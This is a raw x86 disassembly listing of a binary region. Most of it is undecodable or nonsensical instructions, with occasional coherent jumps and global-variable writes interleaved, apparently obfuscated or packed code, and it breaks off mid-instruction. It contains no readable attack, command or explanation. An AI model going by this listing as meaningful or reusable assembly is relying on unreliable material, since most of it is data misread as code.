  41ebdf:	ins    BYTE PTR es:[edi],dx
  41ebe0:	imul   edx,edx,0x20
  41ebe3:	lods   al,BYTE PTR ds:[esi]
  41ebe4:	(bad)  
  41ebe5:	push   esi
  41ebe6:	xchg   esi,eax
  41ebe7:	fsubr  QWORD PTR [eax]
  41ebe9:	rcl    BYTE PTR [ecx],1
  41ebeb:	arpl   WORD PTR [edi-0xc],bx
  41ebee:	sbb    DWORD PTR [esi-0x49],0xfffffffb
  41ebf2:	adc    DWORD PTR [esi+0x6e6ad52c],edi
  41ebf8:	mov    bh,0x80
  41ebfa:	cs adc al,0xb2
  41ebfd:	ret    0xf13b
  41ec00:	out    0x49,eax
  41ec02:	and    eax,0x3e475a33
  41ec07:	dec    ebx
  41ec08:	bound  ebx,QWORD PTR [eax+0x5cc0e7fd]
  41ec0e:	sysenter 
  41ec10:	inc    esi
  41ec11:	mov    edx,0x1457bcd2
  41ec16:	jb     0x41ec6b
  41ec18:	leave  
  41ec19:	into   
  41ec1a:	inc    edi
  41ec1b:	les    eax,FWORD PTR [edi-0x4dbd6d74]
  41ec21:	ja     0x41ec05
  41ec23:	stos   DWORD PTR es:[edi],eax
  41ec24:	fucomip st,st(0)
  41ec26:	gs push cs
  41ec28:	xor    eax,ebx
  41ec2a:	fs cdq 
  41ec2c:	mov    ah,0xa8
  41ec2e:	push   esi
  41ec2f:	pop    DWORD PTR [esi+0x565268f6]
  41ec35:	sub    BYTE PTR [edx],al
  41ec37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec38:	js     0x41ec65
  41ec3a:	inc    ebx
  41ec3b:	out    dx,eax
  41ec3c:	cmc    
  41ec3d:	mov    DWORD PTR [ebp-0x1c],0x4cebda42
  41ec44:	mov    ebx,0x399e
  41ec49:	mov    ebx,0x3cf87511
  41ec4e:	cmp    eax,edx
  41ec50:	mov    DWORD PTR ds:0x42f5cc,0x579
  41ec5a:	jne    0x41ec73
  41ec60:	movzx  eax,WORD PTR ds:0x42f64c
  41ec67:	mov    eax,DWORD PTR [ebp-0x34]
  41ec6a:	cmp    DWORD PTR [ebp-0x24],eax
  41ec6d:	je     0x420b89
  41ec73:	mov    eax,DWORD PTR [ebp-0x3c]
  41ec76:	inc    DWORD PTR ds:0x42f658
  41ec7c:	jmp    0x41ed4a
  41ec81:	mov    WORD PTR [esi],es
  41ec83:	or     eax,0xdd5b8f58
  41ec88:	(bad)  
  41ec89:	fimul  DWORD PTR [ecx-0x40]
  41ec8c:	pop    edi
  41ec8d:	aaa    
  41ec8e:	(bad)
  41ec91:	aas    
  41ec92:	add    DWORD PTR [bx+si],eax
  41ec95:	mov    cl,0x0
  41ec97:	add    BYTE PTR [eax],al
  41ec99:	ret    
  41ec9a:	mov    esi,0xdbf1b7ef
  41ec9f:	pusha  
  41eca0:	nop
  41eca1:	xor    cl,ah
  41eca3:	fs pop ecx
  41eca5:	repz je 0x41ecbe
  41eca8:	cmp    ch,cl
  41ecaa:	(bad)  
  41ecab:	cmp    al,0xe9
  41ecad:	xlat   BYTE PTR ds:[ebx]
  41ecae:	inc    ebp
  41ecaf:	xlat   BYTE PTR ds:[ebx]
  41ecb0:	cmp    cl,bh
  41ecb2:	or     eax,0x60763830
  41ecb7:	add    DWORD PTR [edx],edi
  41ecb9:	add    BYTE PTR [ebx+ebp*1],bl
  41ecbc:	add    ecx,DWORD PTR [ecx]
  41ecbe:	pop    es
  41ecbf:	cmp    bh,BYTE PTR [edi*2+0x948439]
  41ecc6:	inc    edx
  41ecc7:	nop
  41ecc8:	es jbe 0x41eccf
  41eccb:	fsubr  DWORD PTR [esi]
  41eccd:	xchg   edi,eax
  41ecce:	ds sahf 
  41ecd0:	xor    BYTE PTR [eax+0xb628c49],bl
  41ecd6:	arpl   WORD PTR [ebx],sp
  41ecd8:	adc    DWORD PTR [edx+esi*2],edi
  41ecdb:	push   ss
  41ecdc:	ret    0x7a71
  41ecdf:	and    edx,DWORD PTR [ebx+0x28]
  41ece2:	sub    DWORD PTR ds:0x1ca1bb8f,esi
  41ece8:	xchg   BYTE PTR [ecx+eax*8],bh
  41eceb:	repz or BYTE PTR [edi-0x402517a],dl
  41ecf2:	push   ss
  41ecf3:	or     al,0xcf
  41ecf5:	dec    edx
  41ecf6:	xchg   ebp,eax
  41ecf7:	push   0xffffffd5
  41ecf9:	daa    
  41ecfa:	mov    edx,DWORD PTR [ebx+0x49]
  41ecfd:	push   esp
  41ecfe:	test   al,0x27
  41ed00:	das    
  41ed01:	loop   0x41ece9
  41ed03:	or     DWORD PTR [ecx+0x441b6af2],esi
  41ed09:	stos   DWORD PTR es:[edi],eax
  41ed0a:	cmp    edx,DWORD PTR [esi+ebp*4+0x21]
  41ed0e:	sub    bl,BYTE PTR [ecx]
  41ed10:	rcr    DWORD PTR [eax+0xa6cf6cc],0x6c
  41ed17:	push   es
  41ed18:	xor    BYTE PTR [ebx+0x58],0x59
  41ed1c:	out    dx,eax
  41ed1d:	or     eax,DWORD PTR [esi+esi*1-0xd3b081a]
  41ed24:	jb     0x4228a154
  41ed2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed2b:	or     DWORD PTR [esi],0x34
  41ed2e:	sbb    DWORD PTR fs:[ecx+0x74c45135],esp
  41ed35:	std    
  41ed36:	clc    
  41ed37:	mov    edi,0x8fd97d2c
  41ed3c:	stos   BYTE PTR es:[edi],al
  41ed3d:	jb     0x41ed13
  41ed3f:	xchg   DWORD PTR [edx-0x63],ecx
  41ed42:	pop    ds
  41ed43:	or     BYTE PTR [edx-0x3a],ah
  41ed46:	stos   BYTE PTR es:[edi],al
  41ed47:	scas   eax,DWORD PTR es:[edi]
  41ed48:	shl    DWORD PTR [ebx+esi*1],cl
  41ed4b:	shr    cl,cl
  41ed4d:	leave  
  41ed4e:	add    BYTE PTR [eax],al
  41ed50:	add    al,ch
  41ed52:	pop    esp
  41ed53:	pop    es
  41ed54:	ins    DWORD PTR es:[edi],dx
  41ed55:	mov    bh,0x7f
  41ed57:	jmp    0xa995:0x60c6abdd
  41ed5e:	push   edi
  41ed5f:	sti    
  41ed60:	xor    esi,eax
  41ed62:	add    DWORD PTR [bx+si],eax
  41ed65:	mov    cl,0x0
  41ed67:	add    BYTE PTR [eax],al
  41ed69:	fadd   DWORD PTR [edi-0x3dc1ba16]
  41ed6f:	cli    
  41ed70:	test   eax,0x2eca186e
  41ed75:	fs icebp 
  41ed77:	sbb    eax,0x2fd08856
  41ed7c:	mov    bl,0x15
  41ed7e:	push   0xffffff81
  41ed80:	jnp    0x41ed47
  41ed82:	add    esi,DWORD PTR [edx-0x60]
  41ed85:	data16 arpl WORD PTR [edx+ebx*2-0x4c],cx
  41ed8a:	dec    edi
  41ed8b:	test   al,0xb
  41ed8d:	mov    eax,0x8745d317
  41ed92:	rcr    cl,cl
  41ed94:	icebp  
  41ed95:	or     DWORD PTR [ebx],eax
  41ed97:	mov    bl,0xcc
  41ed99:	mov    bh,dl
  41ed9b:	mov    WORD PTR [edx+edi*8-0x75],cs
  41ed9f:	loop   0x41eda5
  41eda1:	pop    eax
  41eda2:	pop    edx
  41eda4:	xchg   edx,eax
  41eda5:	xchg   edx,eax
  41eda6:	jmp    0x41edf0
  41eda8:	add    BYTE PTR [esi+ebp*1],0x51
  41edac:	int    0x70
  41edae:	outs   dx,DWORD PTR ds:[esi]
  41edaf:	dec    esp
  41edb0:	popw   ds
  41edb2:	sbb    BYTE PTR [edx+0x25],0x9
  41edb6:	mov    esi,0xa9c576a3
  41edbb:	xchg   edi,eax
  41edbc:	jecxz  0x41ed72
  41edbe:	shr    DWORD PTR [ecx+0x3f961792],cl
  41edc4:	mov    bh,BYTE PTR [ecx-0x6a]
  41edc7:	or     eax,0x90d6a158
  41edcc:	ss cld 
  41edce:	in     al,0x93
  41edd0:	leave  
  41edd1:	repz fcomp st(5)
  41edd4:	xchg   esp,eax
  41edd5:	div    BYTE PTR [edi]
  41edd7:	retf   0xef98
  41edda:	repz aas 
  41eddc:	sub    BYTE PTR [esi+0x1002434],0xaa
  41ede3:	std    
  41ede4:	adc    ah,al
  41ede6:	cwde   
  41ede7:	jle    0x41ed9b
  41ede9:	subps  xmm0,xmm7
  41edec:	call   0x552e3e70
  41edf1:	(bad)  
  41edf3:	pusha  
  41edf4:	jno    0x41ee47
  41edf6:	(bad)  [ebp-0x64]
  41edf9:	xor    BYTE PTR [ebp-0xb1cbe5b],bl
  41edff:	lds    ecx,FWORD PTR [ebp+0x33a13e3a]
  41ee05:	fucomip st,st(3)
  41ee07:	or     esi,DWORD PTR [ebx+0x322db918]
  41ee0d:	sbb    al,0x54
  41ee0f:	popf   
  41ee10:	sbb    ecx,ebp
  41ee12:	mov    eax,0x5428f9ef
  41ee17:	adc    esp,DWORD PTR [edi-0x3838fccd]
  41ee1d:	add    eax,0x42f5a0
  41ee22:	sbb    DWORD PTR [edi+0x0],ebp
  41ee25:	add    BYTE PTR [ecx-0x8ddc2e],al
  41ee2b:	inc    DWORD PTR [ecx+0x42f64835]
  41ee31:	add    BYTE PTR [ebp-0x16fffff1],dl
  41ee37:	leave  
  41ee38:	add    BYTE PTR [eax],al
  41ee3a:	add    BYTE PTR [ebx+eiz*2+0x13],dh
  41ee3e:	xchg   edx,eax
  41ee3f:	pop    ss
  41ee40:	repnz cmc 
  41ee42:	out    0xef,eax
  41ee44:	mov    esi,0x4e8670a5
  41ee49:	das    
  41ee4a:	xchg   ebp,eax
  41ee4b:	mov    eax,ds:0xb1000168
  41ee50:	add    BYTE PTR [eax],al
  41ee52:	add    BYTE PTR [eax],cl
  41ee54:	aas    
  41ee55:	enter  0x1ee1,0xb9
  41ee59:	pop    eax
  41ee5a:	inc    esi
  41ee5b:	lahf   
  41ee5c:	test   cl,0x7a
  41ee5f:	push   ecx
  41ee60:	cdq    
  41ee61:	mov    BYTE PTR [esi+0x1c10e96e],dh
  41ee67:	jge    0x41edfa
  41ee69:	dec    esi
  41ee6a:	jge    0x41ee86
  41ee6c:	iret   
  41ee6d:	sbb    ebp,DWORD PTR [ecx+eiz*2]
  41ee70:	adc    al,0xfc
  41ee72:	pop    eax
  41ee73:	pop    esi
  41ee74:	push   esp
  41ee75:	enter  0xb2f9,0xf3
  41ee79:	pop    esi
  41ee7a:	nop
  41ee7b:	inc    ebp
  41ee7c:	push   0xfffffff7
  41ee7e:	leave  
  41ee7f:	clc    
  41ee80:	leave  
  41ee81:	xchg   edx,eax
  41ee82:	cmp    eax,0x250dd61f
  41ee87:	and    ah,BYTE PTR [edx-0x396f5205]
  41ee8d:	std    
  41ee8e:	int    0xa
  41ee90:	jg     0x41ee7e
  41ee92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee93:	push   esp
  41ee94:	inc    eax
  41ee95:	mov    DWORD PTR [ecx+0x70],0x259cd596
  41ee9c:	jo     0x41eefd
  41ee9e:	pop    ebp
  41ee9f:	pop    ecx
  41eea0:	or     edi,edi
  41eea2:	out    dx,al
  41eea3:	cmp    ebp,DWORD PTR [esi]
  41eea5:	call   0xa804:0x133be711
  41eeac:	mov    ebp,0xb236167a
  41eeb1:	and    eax,0x8d835f4a
  41eeb6:	pminub mm0,mm3
  41eeb9:	fcmove st,st(7)
  41eebb:	loopne 0x41eee3
  41eebd:	push   ebx
  41eebe:	mov    ebx,0x474f8e6
  41eec3:	daa    
  41eec4:	test   BYTE PTR [edx-0x6c],ah
  41eec7:	pop    ebp
  41eec8:	call   0x92d8f5b2
  41eecd:	jae    0x41eedd
  41eecf:	arpl   bp,sp
  41eed1:	jns    0x41ee97
  41eed3:	addr16 mov eax,0xcb4ff80f
  41eed9:	push   edi
  41eeda:	or     dh,cl
  41eedc:	jno    0x41eed7
  41eede:	imul   esp,DWORD PTR [esi],0x4eb5a9ad
  41eee4:	push   cs
  41eee5:	ds leave 
  41eee7:	aas    
  41eee8:	sbb    eax,0x32ee0ee4
  41eeed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeef:	stc    
  41eef0:	dec    eax
  41eef1:	popa   
  41eef2:	in     al,0xe6
  41eef4:	pop    edx
  41eef5:	push   es
  41eef6:	mov    bh,0xe5
  41eef8:	out    0xfa,eax
  41eefa:	fwait
  41eefb:	call   0xccc6:0x43f9cef2
  41ef02:	out    0x29,eax
  41ef04:	xor    edx,ecx
  41ef06:	adc    ecx,DWORD PTR ds:0x42f564
  41ef0c:	jmp    0x41efda
  41ef11:	mov    WORD PTR [esi-0x15911594],es
  41ef17:	mov    fs,esi
  41ef19:	retf   0x582f
  41ef1c:	fisub  WORD PTR ds:0x529ffd00
  41ef22:	imul   eax,DWORD PTR [ecx],0xb100
  41ef28:	add    BYTE PTR [ecx+0x7c],bh
  41ef2b:	(bad)  
  41ef2c:	push   ebx
  41ef2d:	(bad)  
  41ef2e:	fcmovnbe st,st(6)
  41ef30:	(bad)  
  41ef31:	add    DWORD PTR [esi-0x4950ecb3],eax
  41ef37:	(bad)  
  41ef38:	jge    0x41eef5
  41ef3a:	mov    ebx,0x4d599138
  41ef3f:	addr16 icebp 
  41ef41:	std    
  41ef42:	repnz int3 
  41ef44:	inc    edi
  41ef45:	mov    ds:0x36643013,eax
  41ef4a:	repz in al,dx
  41ef4c:	dec    ebp
  41ef4d:	xor    dh,BYTE PTR [ebx+0x1]
  41ef50:	int    0xee
  41ef52:	std    
  41ef53:	xor    edx,DWORD PTR [ecx+0x65288eb1]
  41ef59:	call   0x85ba:0x4442965b
  41ef60:	add    DWORD PTR [ebp+ecx*1+0x19f79dd8],edi
  41ef67:	xchg   edi,eax
  41ef68:	pop    eax
  41ef69:	add    DWORD PTR [esi],eax
  41ef6b:	loop   0x41ef2a
  41ef6d:	jbe    0x41ef20
  41ef6f:	or     ch,bl
  41ef71:	mov    DWORD PTR ds:0xa5b08858,eax
  41ef77:	(bad)  
  41ef78:	ss jmp 0x47b8e69b
  41ef7e:	jmp    0x41ef18
  41ef80:	jge    0x41ef7e
  41ef82:	sbb    eax,0x6a536025
  41ef87:	and    DWORD PTR [edx],ebx
  41ef89:	jge    0x41efd2
  41ef8b:	ret    0x5992
  41ef8e:	test   al,0x3c
  41ef90:	sub    ah,BYTE PTR [eax-0x7c4339f]
  41ef96:	pop    edi
  41ef97:	hlt    
  41ef98:	cwde   
  41ef99:	adc    al,ah
  41ef9b:	sti    
  41ef9c:	mov    al,0x9d
  41ef9e:	add    edi,DWORD PTR [edx-0x532b0847]
  41efa4:	lahf   
  41efa5:	das    
  41efa6:	stc    
  41efa7:	xchg   ecx,eax
  41efa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efa9:	daa    
  41efaa:	adc    al,0x2a
  41efac:	jbe    0x41ef6a
  41efae:	mov    edi,0xe6c5b46d
  41efb3:	push   esi
  41efb4:	out    dx,eax
  41efb5:	push   eax
  41efb6:	mov    dl,0xa3
  41efb8:	pop    esi
  41efb9:	retf   0xb81d
  41efbc:	test   BYTE PTR ds:0xbd0347df,cl
  41efc2:	jno    0x41ef60
  41efc4:	cmp    edx,esi
  41efc6:	push   ebp
  41efc7:	cmc    
  41efc8:	jo     0x41f017
  41efca:	mov    ds:0x528ee01d,eax
  41efcf:	mov    ebx,esp
  41efd1:	imul   eax,DWORD PTR [eax],0x39
  41efd4:	cld    
  41efd5:	xor    DWORD PTR ds:0x8b0b0a1a,edx
  41efdb:	dec    ebp
  41efdc:	or     BYTE PTR [ecx+0x42f5b025],al
  41efe2:	add    ah,al
  41efe4:	cmc    
  41efe5:	inc    edx
  41efe6:	add    BYTE PTR [ecx-0x367e37b3],cl
  41efec:	je     0x41f05c
  41efee:	add    BYTE PTR [eax],al
  41eff0:	jmp    0x41f0be
  41eff5:	xchg   edx,eax
  41eff6:	or     DWORD PTR [ebp-0x4d42605b],edx
  41effc:	aas    
  41effd:	adc    esp,ecx
  41efff:	jnp    0x41efa6
  41f001:	push   ss
  41f002:	jae    0x41f069
  41f004:	xor    eax,DWORD PTR [ebx]
  41f006:	push   0x1
  41f008:	add    BYTE PTR [ecx+0x26000000],dh
  41f00e:	pop    edi
  41f00f:	dec    ebp
  41f010:	dec    ebx
  41f011:	retf   
  41f012:	mov    BYTE PTR [edx],dl
  41f014:	int    0xec
  41f016:	mov    ebx,0xcf12df78
  41f01b:	xor    BYTE PTR [ebx-0x125fe158],bh
  41f021:	push   ebx
  41f022:	icebp  
  41f023:	xchg   edi,eax
  41f024:	or     al,0x68
  41f026:	mov    eax,0xe7e98fbc
  41f02b:	aas    
  41f02c:	mov    al,0x79
  41f02e:	mov    eax,ds:0x8ed66d25
  41f033:	(bad)  
  41f034:	call   0x87f1146e
  41f039:	xchg   esp,eax
  41f03a:	neg    BYTE PTR [edx]
  41f03c:	or     ah,0x3c
  41f03f:	arpl   WORD PTR [edx],dx
  41f041:	rcr    BYTE PTR [ebx-0x2e],cl
  41f044:	scas   al,BYTE PTR es:[edi]
  41f045:	push   es
  41f046:	jmp    0x234a769a
  41f04b:	(bad)  
  41f04c:	fsubr  DWORD PTR [ebx]
  41f04e:	rcr    DWORD PTR [edx-0x5d540706],1
  41f054:	and    eax,0xbece8747
  41f059:	adc    ecx,DWORD PTR [eax+0x5c]
  41f05c:	outs   dx,BYTE PTR fs:[esi]
  41f05e:	(bad)  
  41f05f:	adc    DWORD PTR [ecx-0x53668493],edx
  41f065:	and    eax,0xbbc0adb2
  41f06a:	mov    ds:0xe8b54642,al
  41f06f:	sbb    al,0x3c
  41f071:	cwde   
  41f072:	jecxz  0x41eff5
  41f074:	mov    ecx,0xa7f8832e
  41f079:	daa    
  41f07a:	outs   dx,DWORD PTR ds:[esi]
  41f07b:	das    
  41f07c:	clc    
  41f07d:	shl    DWORD PTR [ebx],cl
  41f07f:	adc    al,0xfc
  41f081:	sub    DWORD PTR [ebx],0x5385cc0c
  41f087:	and    al,dl
  41f089:	sahf   
  41f08a:	(bad)  
  41f08b:	out    dx,al
  41f08c:	(bad)  
  41f08e:	fidivr WORD PTR [esi]
  41f090:	push   ebx
  41f091:	shr    DWORD PTR [ebp+edx*8-0x26bd5bc8],1
  41f098:	mov    cl,0x40
  41f09a:	jns    0x41f0e8
  41f09c:	(bad)  
  41f09d:	and    BYTE PTR [esi+0x45dbc114],al
  41f0a3:	mov    ch,0x5f
  41f0a5:	xchg   edi,eax
  41f0a6:	mov    edx,0xd08bdb62
  41f0ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ac:	(bad)  
  41f0ad:	jg     0x41f087
  41f0af:	jle    0x41f0af
  41f0b1:	jo     0x41f060
  41f0b3:	repz sub esi,DWORD PTR [ebp-0x5d]
  41f0b7:	in     al,dx
  41f0b8:	loop   0x41f0d9
  41f0ba:	jbe    0x41f085
  41f0bc:	loope  0x41f082
  41f0be:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0c1:	mov    DWORD PTR ds:0x42f5c8,0x41cf
  41f0cb:	xor    eax,esi
  41f0cd:	mov    DWORD PTR ds:0x42f550,0x703d
  41f0d7:	jmp    0x41f1a5
  41f0dc:	xchg   esp,eax
  41f0dd:	sub    dh,BYTE PTR gs:[eax-0x5]
  41f0e1:	jg     0x41f0c1
  41f0e3:	in     eax,0x7f
  41f0e5:	add    dh,BYTE PTR [edx-0x5f]
  41f0e8:	out    dx,eax
  41f0e9:	out    dx,eax
  41f0ea:	jno    0x41f08b
  41f0ec:	mov    ah,0x6a
  41f0ee:	add    DWORD PTR [eax],eax
  41f0f0:	mov    cl,0x0
  41f0f2:	add    BYTE PTR [eax],al
  41f0f4:	mov    eax,0xf8ab6432
  41f0f9:	sbb    dh,cl
  41f0fb:	dec    edx
  41f0fc:	add    al,0xd1
  41f0fe:	push   ecx
  41f0ff:	mov    bl,0x42
  41f101:	jle    0x41f087
  41f103:	fnstcw WORD PTR [esi+0x109f9b9e]
  41f109:	je     0x41f135
  41f10b:	call   0x3982:0x7e10d131
  41f112:	push   ds
  41f113:	adc    esp,DWORD PTR ds:0x2807bed6
  41f119:	lods   eax,DWORD PTR ds:[esi]
  41f11a:	das    
  41f11b:	xor    bl,dh
  41f11d:	popa   
  41f11e:	aaa    
  41f11f:	lahf   
  41f120:	test   DWORD PTR [ecx+ecx*2-0x7188327e],ebp
  41f127:	sbb    eax,0x5184a849
  41f12c:	sub    edx,DWORD PTR [eax]
  41f12e:	xlat   BYTE PTR ds:[ebx]
  41f12f:	push   ebx
  41f130:	mov    ebx,ebp
  41f132:	in     eax,0x49
  41f134:	jge    0x41f19e
  41f136:	and    BYTE PTR [edi],bh
  41f138:	pop    es
  41f139:	jg     0x41f157
  41f13b:	inc    ebx
  41f13c:	push   esp
  41f13d:	out    dx,eax
  41f13e:	mov    esi,DWORD PTR [eax-0x783bf20f]
  41f144:	fst    DWORD PTR [ebx+esi*8+0x38134488]
  41f14b:	adc    DWORD PTR [ebx-0x13],ecx
  41f14e:	and    eax,DWORD PTR [ebp+esi*1+0x7b2a0bb7]
  41f155:	jg     0x41f196
  41f157:	ficom  WORD PTR [ebx-0x3c]
  41f15a:	or     cl,BYTE PTR [ebx-0x185fbeab]
  41f160:	dec    edi
  41f161:	ret    0x22c0
  41f164:	adc    DWORD PTR [ecx-0x772a622e],ebx
  41f16a:	(bad)  
  41f16b:	loop   0x41f121
  41f16d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f16e:	xchg   ecx,eax
  41f16f:	cmp    dh,ch
  41f171:	pop    eax
  41f172:	std    
  41f173:	mov    DWORD PTR [edi+ecx*8+0x20535b62],ebp
  41f17a:	sub    BYTE PTR [ebx-0x16],0x27
  41f17e:	inc    ebp
  41f17f:	dec    eax
  41f180:	jno    0x41f154
  41f182:	fimul  DWORD PTR [ebx+0x6f]
  41f185:	sub    bl,BYTE PTR [esi]
  41f187:	sbb    dl,bl
  41f189:	or     edi,DWORD PTR [eax-0x1d3c132a]
  41f18f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f190:	push   esi
  41f191:	sti    
  41f192:	adc    cl,bl
  41f194:	fnstsw ax
  41f196:	mov    DWORD PTR [ebx],esi
  41f198:	sub    BYTE PTR [edx+0x6],cl
  41f19b:	popf   
  41f19c:	adc    ebp,esp
  41f19e:	iret   
  41f19f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1a0:	sub    al,0xfa
  41f1a2:	mov    ds:0x4d899977,al
  41f1a7:	int3   
  41f1a8:	mov    DWORD PTR ds:0x42f660,0x2387
  41f1b2:	cmp    eax,DWORD PTR [ebp-0x38]
  41f1b5:	mov    DWORD PTR ds:0x42f590,0xa29
  41f1bf:	jmp    0x41f28d
  41f1c4:	and    eax,0xd5fbc5f4
  41f1c9:	sti    
  41f1ca:	aas    
  41f1cb:	(bad)  
  41f1cc:	cmc    
  41f1cd:	cld    
  41f1ce:	call   0xf02555ef
  41f1d3:	mov    eax,ds:0x16b65
  41f1d8:	mov    cl,0x0
  41f1da:	add    BYTE PTR [eax],al
  41f1dc:	aad    0xed
  41f1de:	fld    TBYTE PTR [edx]
  41f1e0:	pusha  
  41f1e1:	jp     0x41f252
  41f1e3:	dec    eax
  41f1e4:	xchg   edi,eax
  41f1e5:	popf   
  41f1e6:	pop    ds
  41f1e7:	add    cl,BYTE PTR ds:0xfb401430
  41f1ed:	cmp    al,0x71
  41f1ef:	mov    ds:0x59d33c9e,al
  41f1f4:	and    BYTE PTR [ebp+0x7],dl
  41f1f7:	mov    ecx,0x46f53793
  41f1fc:	ds pop esp
  41f1fe:	xchg   esp,eax
  41f1ff:	stos   BYTE PTR es:[edi],al
  41f200:	cs cmp al,0xf
  41f203:	mov    dh,0x16
  41f205:	pop    ds
  41f206:	mov    ah,0x47
  41f208:	cmc    
  41f209:	adc    BYTE PTR [ecx+0x3e5ba6b8],ch
  41f20f:	int3   
  41f210:	push   es
  41f211:	adc    ah,BYTE PTR [edi+0x34aff554]
  41f217:	sbb    BYTE PTR [ebx+0x1c7d9e67],ch
  41f21d:	cwde   
  41f21e:	cmp    BYTE PTR [edi+0x6a56bca1],ah
  41f224:	fcmovu st,st(6)
  41f226:	je     0x41f257
  41f228:	push   ecx
  41f229:	or     al,0xc3
  41f22b:	cwde   
  41f22c:	xchg   edx,edx
  41f22e:	nop
  41f22f:	dec    esi
  41f230:	push   edx
  41f231:	inc    esp
  41f232:	push   esi
  41f233:	sbb    edx,ebp
  41f235:	adc    DWORD PTR [ecx+0x7e],eax
  41f238:	sbb    edi,DWORD PTR es:[ebp-0x5f]
  41f23c:	mov    ds:0xffbbab30,eax
  41f241:	retf   
  41f242:	mov    ebx,DWORD PTR [eax+0x57]
  41f245:	test   DWORD PTR [ecx+0x387113b5],eax
  41f24b:	ss add al,0x76
  41f24e:	add    BYTE PTR [edx-0x6e],dl
  41f251:	scas   eax,DWORD PTR es:[edi]
  41f252:	xor    eax,0xa9e8f05e
  41f257:	adc    DWORD PTR ds:0xd354798,ecx
  41f25d:	dec    ebx
  41f25e:	adc    eax,0xa0b01fb5
  41f263:	mov    edi,0xed0f1435
  41f268:	mov    ecx,ebx
  41f26a:	outs   dx,DWORD PTR ds:[esi]
  41f26b:	pop    edi
  41f26c:	cmp    ecx,DWORD PTR [edx+esi*8-0x35]
  41f270:	bound  esi,QWORD PTR [ebp-0x5efb94e6]
  41f276:	xchg   esi,eax
  41f277:	leave  
  41f278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f279:	jne    0x41f275
  41f27b:	cmp    eax,0xd7b6c789
  41f280:	sbb    eax,0x33ec83de
  41f285:	(bad)  
  41f286:	mov    eax,0x5c58e24c
  41f28b:	push   esp
  41f28c:	push   ecx
  41f28d:	jne    0x41f2af
  41f293:	mov    DWORD PTR ds:0x42f5e0,0x2911
  41f29d:	cmp    edx,ecx
  41f29f:	mov    DWORD PTR ds:0x42f544,0x33dc
  41f2a9:	je     0x420b89
  41f2af:	cmp    DWORD PTR ds:0x42f5c4,0x0
  41f2b6:	jb     0x41f3ac
  41f2bc:	add    edx,ecx
  41f2be:	jmp    0x41f3ac
  41f2c3:	push   DWORD PTR [ebp-0x28]
  41f2c6:	push   0x4dc8
  41f2cb:	push   0x7d46
  41f2d0:	push   0x365d
  41f2d5:	push   DWORD PTR [ebp-0x24]
  41f2d8:	call   DWORD PTR ds:0x4387d4
  41f2de:	jmp    0x41f3ac
  41f2e3:	arpl   ax,dx
  41f2e5:	xchg   esp,eax
  41f2e6:	push   ecx
  41f2e7:	mov    bh,0x55
  41f2e9:	out    0xf2,eax
  41f2eb:	hlt    
  41f2ec:	mov    cl,0xa9
  41f2ee:	aas    
  41f2ef:	xchg   edx,eax
  41f2f0:	dec    edi
  41f2f1:	push   edx
  41f2f2:	pop    ecx
  41f2f3:	push   ss
  41f2f4:	ins    BYTE PTR es:[edi],dx
  41f2f5:	add    DWORD PTR [eax],eax
  41f2f7:	mov    cl,0x0
  41f2f9:	add    BYTE PTR [eax],al
  41f2fb:	pop    esi
  41f2fc:	das    
  41f2fd:	in     eax,0x1d
  41f2ff:	not    BYTE PTR [ebx+0x70]
  41f302:	or     edx,edx
  41f304:	loope  0x41f2b5
  41f306:	fcom   DWORD PTR [ebx-0x50]
  41f309:	and    DWORD PTR [edx],edx
  41f30b:	dec    eax
  41f30c:	add    eax,0x25bd629a
  41f311:	leave  
  41f312:	xchg   edi,eax
  41f313:	pop    ds
  41f314:	pop    edi
  41f315:	cmc    
  41f316:	push   0x481ddb4f
  41f31b:	js     0x41f31a
  41f31d:	push   esp
  41f31e:	lods   al,BYTE PTR ds:[esi]
  41f31f:	retf   
  41f320:	shr    BYTE PTR [eax+0x7caa80c7],0xdb
  41f327:	clc    
  41f328:	bound  ecx,QWORD PTR [edx+0x77]
  41f32b:	call   0xed581434
  41f330:	dec    ecx
  41f331:	add    DWORD PTR [ecx+0x391fddb1],edx
  41f337:	hlt    
  41f338:	scas   eax,DWORD PTR es:[edi]
  41f339:	sub    ch,BYTE PTR [eax-0x19f800ef]
  41f33f:	leave  
  41f340:	jns    0x41f33b
  41f342:	or     BYTE PTR ds:[edx-0x3],bh
  41f346:	add    bh,bh
  41f348:	ja     0x41f37e
  41f34a:	inc    ecx
  41f34b:	dec    esp
  41f34c:	retf   0x6fbf
  41f34f:	or     al,0x9c
  41f351:	jns    0x41f3a9
  41f353:	fsub   QWORD PTR [edi]
  41f355:	(bad)  
  41f356:	jnp    0x41f3d7
  41f358:	push   edx
  41f359:	cwde   
  41f35a:	stos   BYTE PTR es:[edi],al
  41f35b:	xor    BYTE PTR [ebx+0x7d6f3b5f],0xa4
  41f362:	idiv   ecx
  41f364:	pop    ebp
  41f365:	push   esi
  41f366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f367:	pop    ebp
  41f368:	sbb    ecx,ecx
  41f36a:	out    dx,eax
  41f36b:	mov    cl,0xe5
  41f36d:	push   esp
  41f36e:	repz xlat BYTE PTR ds:[ebx]
  41f370:	and    bl,BYTE PTR [ecx+0x6f]
  41f373:	out    dx,al
  41f374:	pop    ebp
  41f375:	(bad)  
  41f376:	ins    BYTE PTR es:[edi],dx
  41f377:	push   ebx
  41f378:	call   0x926f:0x4392339c
  41f37f:	fsubr  QWORD PTR [esi]
  41f381:	cmp    DWORD PTR ds:0xf91e7618,ebp
  41f387:	daa    
  41f388:	pop    esi
  41f389:	mov    dx,0x1c83
  41f38d:	outs   dx,DWORD PTR ds:[esi]
  41f38e:	int3   
  41f38f:	int    0x42
  41f391:	xor    DWORD PTR [ecx-0x2f675a10],0xfffffff6
  41f398:	jp     0x41f3ef
  41f39a:	dec    ebx
  41f39b:	mov    ecx,?
